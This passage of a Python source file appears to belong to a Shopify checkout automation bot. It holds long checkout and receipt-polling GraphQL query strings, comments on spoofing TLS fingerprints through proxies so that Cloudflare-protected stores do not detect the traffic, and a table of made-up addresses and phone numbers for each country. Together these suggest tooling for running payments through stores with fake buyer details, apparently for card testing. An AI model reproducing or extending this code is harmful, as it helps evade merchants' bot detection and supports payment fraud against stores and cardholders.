InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}
"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}purchaseOrder{payment{...on PurchaseOrderPaymentTerms{paymentLines{postPaymentMessage paymentMethod{...on DirectPaymentMethod{paymentMethodIdentifier creditCard{brand lastDigits __typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

# ──────────────────────────────────────────────────────────────
# SSL CONTEXT: Use selective SSL verification instead of blanket ssl=False
# ──────────────────────────────────────────────────────────────
# Shopify + Cloudflare use valid certs — ssl=False bypasses them,
# which can trigger TLS fingerprinting detection on some stores.
# We still need to bypass SSL for proxy connections that may use
# self-signed certs, so we create a context that skips verification
# only when needed (proxy connections) and verifies normally otherwise.
# ──────────────────────────────────────────────────────────────

# SSL context and connector functions removed — tls-requests handles TLS/SSL
# via the client_identifier parameter. No need to manually create SSL contexts.
# tls-requests' client_identifier sets the entire TLS fingerprint (JA3/JA4 hash),
# cipher suites, ALPN protocols, and certificate verification automatically.

C2C = {
    "USD": "US",
    "CAD": "CA", 
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "EUR": "DE",
    "AUD": "AU",
    "CHF": "CH",
    # TLD-to-currency mappings for common country TLDs
    "UK": "GB",  # .co.uk TLD maps to GB country
    "DE": "DE",
    "FR": "FR",
    "JP": "JP",
}

# TLD-to-country-code mapping for common Shopify TLDs
# Used when the TLD is a country code (like .co.uk → GB)
_TLD_TO_COUNTRY = {
    "UK": "GB",   # .co.uk → Great Britain
    "AU": "AU",   # .com.au → Australia  
    "CA": "CA",   # .ca → Canada
    "IN": "IN",   # .in → India
    "DE": "DE",   # .de → Germany
    "FR": "FR",   # .fr → France
    "JP": "JP",   # .co.jp → Japan
    "NL": "NL",   # .nl → Netherlands
    "US": "US",   # .com → US (fallback)
    "COM": "US",  # .com default
    "ORG": "US",  # .org default
    "NET": "US",  # .net default
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "UK": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},  # Alias: UK → GB
    "DE": {"address1": "Friedrichstrasse 45", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "4930123456"},
    "FR": {"address1": "12 Rue de Rivoli", "city": "Paris", "postalCode": "75001", "zoneCode": "IDF", "countryCode": "FR", "phone": "3312345678"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "501234567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "55555555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
